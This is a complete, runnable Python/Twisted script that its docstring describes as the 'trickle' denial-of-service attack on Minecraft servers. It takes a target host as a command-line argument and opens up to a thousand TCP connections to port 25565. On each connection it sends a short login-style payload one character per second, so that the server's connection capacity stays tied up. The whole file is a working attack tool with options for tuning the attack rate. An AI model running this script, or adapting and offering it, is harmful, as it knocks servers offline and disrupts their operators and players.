#!/usr/bin/env python

from optparse import OptionParser
import random
import string
from struct import pack
import sys

usage = """usage: %prog [options] host

I am quite noisy by default; consider redirecting or filtering my output."""

parser = OptionParser(usage)
parser.add_option("-c", "--count",
    dest="count",
    type="int",
    default=2,
    metavar="COUNT",
    help="Number of connections per interval",
)
parser.add_option("-m", "--max",
    dest="max",
    type="int",
    default=1000,
    metavar="COUNT",
    help="Maximum number of connections to spawn",
)
parser.add_option("-i", "--interval",
    dest="interval",
    type="float",
    default=0.02,
    metavar="INTERVAL",
    help="Time to wait between connections",
)
options, arguments = parser.parse_args()
if len(arguments) != 1:
    parser.error("Need exactly one argument")

# Use poll(). To use another reactor, just change these lines.
# OSX users probably want to pick another reactor. (Or maybe another OS!)
# Linux users should definitely do epoll().
from twisted.internet import pollreactor
pollreactor.install()

from twisted.internet import reactor
from twisted.internet.protocol import Factory, Protocol
from twisted.internet.endpoints import TCP4ClientEndpoint
from twisted.internet.task import LoopingCall
from twisted.python import log

log.startLogging(sys.stdout)

class TrickleProtocol(Protocol):
    """
    Implementation of the "trickle" DoS attack on MC servers.
    """

    def __init__(self):
        """
        Prepare our payload.
        """

        length = random.randint(18, 20)
        self.payload = "\x02\x00%s%s" % (
            pack(">b", length),
            "".join(random.choice(string.printable) for i in range(length)))
        self.index = 0

    def connectionMade(self):
        """
        Send our payload at an excrutiatingly slow pace.
        """

        # Send the packet type immediately, and then enter into the library
        # function with the next part of the payload.
        self.sendchar()
        self.loop = LoopingCall(self.sendchar)
        self.loop.start(1)

    def sendchar(self):
        """
        Send a single character down the pipe.
        """

        self.transport.write(self.payload[self.index])
        self.index += 1
        if self.index >= len(self.payload):
            # Just stop and wait to get reaped.
            self.loop.stop()

    def connectionLost(self, reason):
        """
        Remove ourselves from the factory.
        """

        self.factory.connections.discard(self)

class TrickleFactory(Factory):
    """
    Factory for maintaining a certain number of open connections.
    """

    protocol = TrickleProtocol

    def __init__(self):
        self.connections = set()
        self.pending = set()
        self.endpoint = TCP4ClientEndpoint(reactor, arguments[0], 25565,
            timeout=2)

        LoopingCall(self.log_status).start(1)
        LoopingCall(self.spawn_connection).start(options.interval)

    def spawn_connection(self):
        for i in range(options.count):
            if len(self.connections) + len(self.pending) >= options.max:
                return

            d = self.endpoint.connect(self)
            self.pending.add(d)

            def cb(protocol):
                self.pending.discard(d)
                self.connections.add(protocol)
            def eb(reason):
                pass
            d.addCallbacks(cb, eb)

    def log_status(self):
        log.msg("%d active connections, %d pending connections" %
            (len(self.connections), len(self.pending)))

log.msg("Trickling against %s" % arguments[0])
log.msg("Running with up to %d connections" % options.max)
log.msg("Time interval: %fs, %d conns (%d conns/s)" %
    (options.interval, options.count, options.count * int(1 / options.interval)))
factory = TrickleFactory()
reactor.run()
